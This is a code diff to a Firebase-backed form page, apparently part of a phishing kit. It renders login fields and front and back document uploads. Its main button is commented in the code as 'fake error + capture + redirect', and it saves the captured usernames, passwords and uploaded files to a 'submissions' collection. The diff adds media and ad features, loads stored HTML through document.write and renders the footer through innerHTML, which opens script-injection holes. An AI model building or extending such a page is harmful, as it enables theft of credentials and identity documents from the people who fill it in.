@@ -1,5 +1,3 @@
-Form.html
-
 <!doctype html>
 <html>
 <head>
@@ -28,6 +26,11 @@ input,textarea,select,button{width:100%;padding:8px;margin-top:6px;border-radius
 textarea{min-height:70px}
 .draggableBtn{position:absolute;cursor:pointer;color:#fff;border:none;border-radius:8px}
 .embedLink{margin-top:6px;padding:6px;background:#e8f0fe;border-radius:6px}
+
+@keyframes fadeIn {
+  from {opacity:0;}
+  to {opacity:1;}
+}
 </style>
 
 <!-- Firebase -->
@@ -39,7 +42,7 @@ textarea{min-height:70px}
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 </head>
 <body>
-<div class="wrap" id="formWrap"></div>
+<div class="wrap" id="formWrap">Loading form...</div>
 
 <script>
 // Firebase setup
@@ -78,14 +81,34 @@ async function uploadFile(file) {
   return url;
 }
 
+const formId = getQueryParam("id");
+
 function renderForm(data){
   const wrap = document.getElementById("formWrap");
   wrap.innerHTML = "";
   wrap.style.background = data.bgColor || "#fff";
-  if(data.bgImageURL){
-    wrap.style.backgroundImage = `url(${data.bgImageURL})`;
-    wrap.style.backgroundSize = data.bgSize || "cover";
-  }
+  if(data.bgImage){
+  wrap.style.backgroundImage = `url(${data.bgImage})`;
+  wrap.style.backgroundSize = data.bgSize || "cover";
+}
+
+// 🎥 BACKGROUND VIDEO
+document.querySelectorAll("video").forEach(v => v.remove());
+if(data.bgVideoURL){
+  const video = document.createElement("video");
+  video.src = data.bgVideoURL;
+  video.autoplay = true;
+  video.loop = true;
+  video.muted = true;
+
+  video.style.position = "fixed";
+  video.style.width = "100%";
+  video.style.height = "100%";
+  video.style.objectFit = "cover";
+  video.style.zIndex = "-1";
+
+  document.body.appendChild(video);
+}
 
   // Header images
   if(data.avatarURL){
@@ -97,21 +120,32 @@ function renderForm(data){
     img.style.margin = "auto";
     wrap.appendChild(img);
   }
-  if(data.logoURL){
-    const img = document.createElement("img");
-    img.src = data.logoURL;
-    img.style.width = "140px";
-    img.style.display = "block";
-    img.style.margin = "auto";
-    wrap.appendChild(img);
-  }
+  if(data.logoURL || data.bannerURL){
+  const img = document.createElement("img");
+  img.src = data.logoURL || data.bannerURL;
+  img.style.width = "140px";
+  img.style.display = "block";
+  img.style.margin = "auto";
+  wrap.appendChild(img);
+}
 
-  // Titles & description
-  const title = document.createElement("h2");
-  title.style.textAlign = "center";
-  title.style.color = data.titleColor || "#111";
-  title.textContent = data.title || data.pageTitle || "Untitled Form";
-  wrap.appendChild(title);
+// 🏷 TITLE
+const title = document.createElement("h2");
+
+title.textContent = data.title || data.pageTitle || "Untitled Form";
+
+// ✅ Position
+title.style.textAlign = data.titlePosition || "center";
+
+// ✅ Color
+title.style.color = data.titleColor || "#111";
+
+// ✅ Animation
+if(data.titleAnimation && data.titleAnimation !== "none"){
+  title.style.animation = `${data.titleAnimation} 1s ease`;
+}
+
+wrap.appendChild(title);
 
   const subtitle = document.createElement("p");
   subtitle.style.textAlign = "center";
@@ -122,6 +156,46 @@ function renderForm(data){
   const desc = document.createElement("p");
   desc.textContent = data.description || "";
   wrap.appendChild(desc);
+  
+  // 🖼 GALLERY
+if(data.galleryImages){
+  const gallery = document.createElement("div");
+
+  gallery.style.display = "grid";
+  gallery.style.gridTemplateColumns =
+    data.galleryLayout === "grid" ? "repeat(3,1fr)" :
+    data.galleryLayout === "large-grid" ? "repeat(2,1fr)" :
+    "1fr";
+
+  gallery.style.gap = "10px";
+
+  data.galleryImages.split("\n").forEach(url=>{
+    if(!url.trim()) return;
+
+    const img = document.createElement("img");
+    img.src = url.trim();
+    img.style.width = "100%";
+
+    gallery.appendChild(img);
+  });
+
+  wrap.appendChild(gallery);
+}
+
+// 🎥 VIDEOS
+if(data.videoLinks){
+  data.videoLinks.split("\n").forEach(link=>{
+    if(!link.trim()) return;
+
+    const iframe = document.createElement("iframe");
+    iframe.src = link;
+    iframe.style.width = "100%";
+    iframe.style.height = "200px";
+    iframe.allowFullscreen = true;
+
+    wrap.appendChild(iframe);
+  });
+}
 
   // Warning
   if(data.enableWarning && data.warningPosition !== "none"){
@@ -140,29 +214,63 @@ function renderForm(data){
   formDiv.style.gap = "8px";
 
   // Auth fields
-  if(data.addAuth){
+  if(data.addAuth === true){
     const inputUser = document.createElement("input");
-    inputUser.placeholder = data.usernamePlaceholder || "Username";
+inputUser.placeholder = data.usernamePlaceholder || "Username";
+
+inputUser.style.background = data.inputBgColor || "#fff";
+inputUser.style.color = data.inputTextColor || "#000";
+inputUser.style.border = `1px solid ${data.inputBorderColor || "#ccc"}`;
+inputUser.style.borderRadius = data.customRadius 
+  ? data.customRadius + "px" 
+  : "6px";
     formDiv.appendChild(inputUser);
 
     const inputPass = document.createElement("input");
-    inputPass.type = "password";
-    inputPass.placeholder = data.passwordPlaceholder || "Password";
+inputPass.type = "password";
+inputPass.placeholder = data.passwordPlaceholder || "Password";
+
+inputPass.style.background = data.inputBgColor || "#fff";
+inputPass.style.color = data.inputTextColor || "#000";
+inputPass.style.border = `1px solid ${data.inputBorderColor || "#ccc"}`;
+inputPass.style.borderRadius = data.customRadius 
+  ? data.customRadius + "px" 
+  : "6px";
     formDiv.appendChild(inputPass);
   }
 
   // Extra fields
-  const extraInputs = [];
-  if(data.extraFields && data.extraFields.length){
-    data.extraFields.forEach(v=>{
-      if(v.trim()){
-        const input = document.createElement("input");
-        input.placeholder = v.trim();
-        formDiv.appendChild(input);
-        extraInputs.push(input);
-      }
-    });
-  }
+const extraInputs = [];
+
+if(Array.isArray(data.extraFields) && data.extraFields.length > 0){
+  data.extraFields.forEach(v=>{
+    if(v.trim()){
+      const input = document.createElement("input");
+      input.style.background = data.inputBgColor || "#fff";
+input.style.color = data.inputTextColor || "#000";
+input.style.border = `1px solid ${data.inputBorderColor || "#ccc"}`;
+input.style.borderRadius = data.customRadius 
+  ? data.customRadius + "px" 
+  : "6px";
+      input.placeholder = v.trim();
+      formDiv.appendChild(input);
+      extraInputs.push(input);
+    }
+  });
+}
+
+// ✅ Upload fields (only if enabled)
+if(data.enableFileUpload){
+  const frontInput = document.createElement("input");
+  frontInput.type = "file";
+  frontInput.id = "frontUpload";
+  formDiv.appendChild(frontInput);
+
+  const backInput = document.createElement("input");
+  backInput.type = "file";
+  backInput.id = "backUpload";
+  formDiv.appendChild(backInput);
+}
 
   // Embed Links
   if(data.embedLinks){
@@ -189,7 +297,7 @@ function renderForm(data){
   }
 
   // Generate Button
-  if(data.showGenerateBtn){
+  if(data.showGenerateBtn === true){
     const genBtn = document.createElement("button");
     genBtn.textContent = data.generateBtnText || "Generate";
     genBtn.style.background = "#1976d2";
@@ -202,8 +310,11 @@ function renderForm(data){
   }
 
   // Main Button (fake error + capture + redirect)
-  if(data.showMainBtn){
+  if(data.showMainBtn === true){
     const mainBtn = document.createElement("button");
+    if(data.btnAnimationEffect){
+  mainBtn.className = data.btnAnimationEffect.join(" ");
+}
     mainBtn.textContent = data.buttonText || "Submit";
     mainBtn.style.background = data.btnColor || "#1976d2";
     mainBtn.style.color = "#fff";
@@ -231,9 +342,14 @@ function renderForm(data){
   const fileURL = [uploadedFront, uploadedBack].filter(Boolean).join(" | ");
 
   // 2️⃣ Collect form values
-  const username = formDiv.querySelector('input[type="text"]')?.value || "";
-  const password = formDiv.querySelector('input[type="password"]')?.value || "";
-  const extraValues = extraInputs.map(i=>i.value);
+  const inputs = formDiv.querySelectorAll("input");
+
+const username = inputs[0]?.value || "";
+const password = inputs[1]?.value || "";
+
+
+// ✅ FIX: collect extra field values
+const extraValues = extraInputs.map(i => i.value);
 
   // 3️⃣ Save
   await db.collection("submissions").add({
@@ -281,6 +397,21 @@ Time: ${new Date().toLocaleString()}
   }
 
   wrap.appendChild(formDiv);
+  
+   // 📢 ADS
+if(data.enableAds){
+  const ad = document.createElement("div");
+  ad.style.padding = "10px";
+  ad.style.background = "#fff3cd";
+  ad.style.margin = "10px 0";
+
+  ad.innerHTML = `
+    <strong>Sponsored</strong><br>
+    ${data.adText || ""}
+  `;
+
+  wrap.appendChild(ad);
+}
 
   // Extra draggable buttons
   if(data.extraButtons){
@@ -305,12 +436,9 @@ Time: ${new Date().toLocaleString()}
   footer.style.textAlign = "center";
   footer.style.marginTop = "10px";
   footer.style.fontSize = "12px";
-  footer.textContent = data.footerText || "";
+  footer.innerHTML = data.footerText || "";
   wrap.appendChild(footer);
 }
-
-// Load form
-const formId = getQueryParam("id");
 
 if(formId){
   db.collection("forms").doc(formId).get()
@@ -322,6 +450,7 @@ if(formId){
     }
 
     const data = doc.data();
+    console.log("FORM DATA:", data);
     
     // ✅ UPDATE SEO META TAGS (for browser, not bots)
 const seoTitle = data.seoTitle || data.title || "Untitled Form";
@@ -340,19 +469,14 @@ document.querySelector('meta[name="twitter:title"]')?.setAttribute("content", se
 document.querySelector('meta[name="twitter:description"]')?.setAttribute("content", metaDesc);
 document.querySelector('meta[name="twitter:image"]')?.setAttribute("content", ogImage);
 
-    // ✅ If full HTML exists → use it
-    if (data.html) {
-      document.open();
-      document.write(data.html);
-      document.close();
-      return; // 🔥 VERY IMPORTANT
-    }
-
-    // fallback
-    renderForm(data);
-
-    // title only for fallback mode
-    document.title = data.title || data.pageTitle || "Untitled Form";
+// ✅ LOAD GENERATED HTML DIRECTLY
+if (data.htmlContent) {
+  document.open();
+  document.write(data.htmlContent);
+  document.close();
+} else {
+  document.getElementById("formWrap").textContent = "⚠️ Old form format not supported.";
+}
 
   })
   .catch(err => {
@@ -362,6 +486,7 @@ document.querySelector('meta[name="twitter:image"]')?.setAttribute("content", og
 } else {
   document.getElementById("formWrap").textContent = "No form ID provided.";
 }
+
 </script>
 </body>
 </html>
